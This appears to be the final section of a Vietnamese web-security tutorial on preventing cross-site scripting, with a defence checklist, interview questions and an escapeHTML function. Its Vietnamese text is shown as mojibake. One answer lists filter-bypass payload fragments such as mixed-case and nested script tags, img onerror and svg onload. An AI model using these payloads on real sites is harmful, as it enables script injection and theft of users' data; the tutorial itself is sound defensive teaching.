  â”‚  â”‚ XSS (JS)    â”‚         â”‚ â‘¢ CSP + COOKIES  â”‚         â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚ CSP headers       â”‚         â”‚
  â”‚                           â”‚ HttpOnly cookies  â”‚         â”‚
  â”‚                           â”‚ Secure flag       â”‚         â”‚
  â”‚                           â”‚ SameSite flag     â”‚         â”‚
  â”‚                           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚
  â”‚                                                        â”‚
  â”‚  THÃŠM:                                                 â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â‘£ Input Validation (whitelist characters!)     â”‚  â”‚
  â”‚  â”‚  â‘¤ URL Validation (cháº·n javascript: protocol!) â”‚  â”‚
  â”‚  â”‚  â‘¥ Framework Protection (React auto-escape!)    â”‚  â”‚
  â”‚  â”‚  â‘¦ HTTP Headers (X-XSS-Protection, HSTS...)    â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 12.2. XSS Defense Checklist!

```
  XSS PREVENTION CHECKLIST:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  âœ… SERVER-SIDE:                                       â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â–¡ Escape ALL output theo Ä‘Ãºng context!          â”‚  â”‚
  â”‚  â”‚    â€¢ HTML body â†’ escapeHTML()                   â”‚  â”‚
  â”‚  â”‚    â€¢ HTML attribute â†’ escapeAttribute()         â”‚  â”‚
  â”‚  â”‚    â€¢ JavaScript â†’ escapeJavaScript()            â”‚  â”‚
  â”‚  â”‚    â€¢ URL â†’ encodeURIComponent()                 â”‚  â”‚
  â”‚  â”‚  â–¡ Set CSP header nghiÃªm ngáº·t!                   â”‚  â”‚
  â”‚  â”‚  â–¡ Set HttpOnly trÃªn session cookies!            â”‚  â”‚
  â”‚  â”‚  â–¡ Set Secure flag trÃªn cookies!                 â”‚  â”‚
  â”‚  â”‚  â–¡ Set SameSite=Strict hoáº·c Lax!                â”‚  â”‚
  â”‚  â”‚  â–¡ Validate & sanitize rich text input!          â”‚  â”‚
  â”‚  â”‚  â–¡ Set X-Content-Type-Options: nosniff!         â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  âœ… CLIENT-SIDE:                                       â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â–¡ DÃ¹ng textContent thay innerHTML!              â”‚  â”‚
  â”‚  â”‚  â–¡ KHÃ”NG dÃ¹ng eval(), new Function()!           â”‚  â”‚
  â”‚  â”‚  â–¡ KHÃ”NG dÃ¹ng document.write()!                 â”‚  â”‚
  â”‚  â”‚  â–¡ Validate href/src trÆ°á»›c khi dÃ¹ng!            â”‚  â”‚
  â”‚  â”‚  â–¡ Sanitize data tá»« URL/hash/postMessage!       â”‚  â”‚
  â”‚  â”‚  â–¡ DÃ¹ng framework auto-escaping (React, Vue)!   â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  âœ… REACT-SPECIFIC:                                    â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â–¡ TRÃNH dangerouslySetInnerHTML!               â”‚  â”‚
  â”‚  â”‚  â–¡ Náº¿u pháº£i dÃ¹ng â†’ Sanitize vá»›i whitelist!     â”‚  â”‚
  â”‚  â”‚  â–¡ Validate URL trÆ°á»›c khi gÃ¡n href!             â”‚  â”‚
  â”‚  â”‚  â–¡ KHÃ”NG render user input thÃ nh component!     â”‚  â”‚
  â”‚  â”‚  â–¡ SSR: Escape JSON trong <script> tag!         â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 12.3. Interview Q&A â€” CÃ¢u Há»i Phá»ng Váº¥n!

**Q1: XSS lÃ  gÃ¬? CÃ³ máº¥y loáº¡i?**

> XSS (Cross-Site Scripting) lÃ  lá»— há»•ng báº£o máº­t cho phÃ©p káº» táº¥n cÃ´ng chÃ¨n JavaScript Ä‘á»™c háº¡i vÃ o trang web mÃ  ngÆ°á»i dÃ¹ng khÃ¡c Ä‘ang xem. CÃ³ 3 loáº¡i chÃ­nh:
>
> 1. **Stored XSS**: Payload lÆ°u trong database, táº¥t cáº£ user xem trang Ä‘á»u bá»‹ áº£nh hÆ°á»Ÿng. Nguy hiá»ƒm nháº¥t!
> 2. **Reflected XSS**: Payload náº±m trong URL, server "pháº£n chiáº¿u" vÃ o HTML response. Cáº§n trick user click link.
> 3. **DOM-based XSS**: Payload xá»­ lÃ½ hoÃ n toÃ n báº±ng JavaScript phÃ­a client, khÃ´ng qua server.

**Q2: XSS bypass Same-Origin Policy nhÆ° tháº¿ nÃ o?**

> SOP ngÄƒn code tá»« origin A truy cáº­p dá»¯ liá»‡u origin B. NhÆ°ng XSS chÃ¨n code **VÃ€O TRONG** origin B. Browser tháº¥y code tá»« origin B â†’ cho phÃ©p truy cáº­p má»i thá»© (cookie, DOM, localStorage). Code hacker cháº¡y vá»›i **cÃ¹ng quyá»n háº¡n** nhÆ° code chÃ­nh chá»§.

**Q3: Táº¡i sao blacklist (lá»c `<script>`) khÃ´ng hiá»‡u quáº£?**

> CÃ³ quÃ¡ nhiá»u cÃ¡ch bypass: VIáº¾T HOA (`<SCRIPT>`), mixed case (`<ScRiPt>`), nested (`<scr<script>ipt>`), dÃ¹ng event handler (`<img onerror=...>`), SVG (`<svg onload=...>`), URL encoding (`%3Cscript%3E`), HTML entities... Blacklist KHÃ”NG BAO GIá»œ liá»‡t kÃª háº¿t.

**Q4: Escape vÃ  Sanitize khÃ¡c gÃ¬ nhau?**

> - **Escape**: Biáº¿n Táº¤T Cáº¢ kÃ½ tá»± Ä‘áº·c biá»‡t thÃ nh text entities (`<` â†’ `&lt;`). Má»i HTML thÃ nh text. DÃ¹ng khi khÃ´ng cáº§n HTML.
> - **Sanitize**: Giá»¯ láº¡i HTML an toÃ n (`<b>`, `<i>`), XÃ“A HTML nguy hiá»ƒm (`<script>`, `onerror`). DÃ¹ng whitelist approach. DÃ¹ng khi cáº§n rich text.

**Q5: CSP lÃ  gÃ¬? CÃ¡ch nÃ³ cháº·n XSS?**

> CSP (Content Security Policy) lÃ  HTTP header bÃ¡o cho browser biáº¿t nguá»“n tÃ i nguyÃªn nÃ o Ä‘Æ°á»£c phÃ©p. VÃ­ dá»¥ `script-src 'self'` chá»‰ cho phÃ©p script tá»« cÃ¹ng origin â†’ inline script bá»‹ cháº·n â†’ XSS bá»‹ vÃ´ hiá»‡u hÃ³a. Nonce-based CSP lÃ  máº¡nh nháº¥t: chá»‰ script cÃ³ `nonce` Ä‘Ãºng má»›i cháº¡y.

**Q6: HttpOnly cookie báº£o vá»‡ gÃ¬? CÃ³ Ä‘á»§ khÃ´ng?**

> HttpOnly ngÄƒn JavaScript Ä‘á»c cookie (document.cookie tráº£ vá» rá»—ng). Chá»‘ng cookie theft qua XSS. NhÆ°ng **KHÃ”NG Äá»¦**: XSS váº«n cÃ³ thá»ƒ keylog, phishing, redirect, vÃ¬ code hacker váº«n cháº¡y Ä‘Æ°á»£c. HttpOnly chá»‰ lÃ  **má»™t lá»›p** trong nhiá»u lá»›p phÃ²ng thá»§.

**Q7: Trong React, Ä‘Ã¢u lÃ  cÃ¡c lá»— há»•ng XSS cáº§n chÃº Ã½?**

> 1. `dangerouslySetInnerHTML` â€” chÃ¨n HTML thÃ´, bá» qua auto-escape
> 2. `href="javascript:..."` â€” React khÃ´ng cháº·n protocol nguy hiá»ƒm
> 3. `eval(userInput)` â€” cháº¡y code do user kiá»ƒm soÃ¡t
> 4. SSR serialization â€” `</script>` trong JSON cÃ³ thá»ƒ thoÃ¡t khá»i tag
> 5. Ref + DOM manipulation â€” bypass React virtual DOM

**Q8: Giáº£i thÃ­ch Sources vÃ  Sinks trong DOM-based XSS?**

> - **Source**: Nguá»“n dá»¯ liá»‡u user cÃ³ thá»ƒ kiá»ƒm soÃ¡t (location.hash, location.search, document.referrer, postMessage, localStorage)
> - **Sink**: NÆ¡i chÃ¨n dá»¯ liá»‡u vÃ o DOM cÃ³ thá»ƒ thá»±c thi code (innerHTML, document.write, eval, setTimeout)
> - XSS xáº£y ra khi dá»¯ liá»‡u Ä‘i tá»« Source â†’ Sink mÃ  khÃ´ng Ä‘Æ°á»£c sanitize.

**Q9: Viáº¿t má»™t hÃ m escapeHTML Ä‘Æ¡n giáº£n?**

```javascript
function escapeHTML(str) {
  var map = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
  };

  return str.replace(/[&<>"']/g, function (char) {
    return map[char];
  });
}
```

**Q10: Cookie nÃªn set nhá»¯ng flag nÃ o cho báº£o máº­t tá»‘i Ä‘a?**

> ```
> Set-Cookie: session_id=value;
>   HttpOnly;     â† JS khÃ´ng Ä‘á»c Ä‘Æ°á»£c!
>   Secure;       â† Chá»‰ gá»­i qua HTTPS!
>   SameSite=Strict; â† Chá»‘ng CSRF!
>   Path=/;       â† Pháº¡m vi toÃ n site!
>   Max-Age=3600  â† Háº¿t háº¡n sau 1 giá»!
> ```

---

> **ğŸ“Œ GHI NHá»š**: XSS lÃ  cuá»™c chiáº¿n **phÃ²ng thá»§ nhiá»u lá»›p**!
> KhÃ´ng cÃ³ giáº£i phÃ¡p Ä‘Æ¡n láº» nÃ o lÃ  Ä‘á»§.
> Escape + Sanitize + CSP + HttpOnly + Validate = Báº¢O Máº¬T!
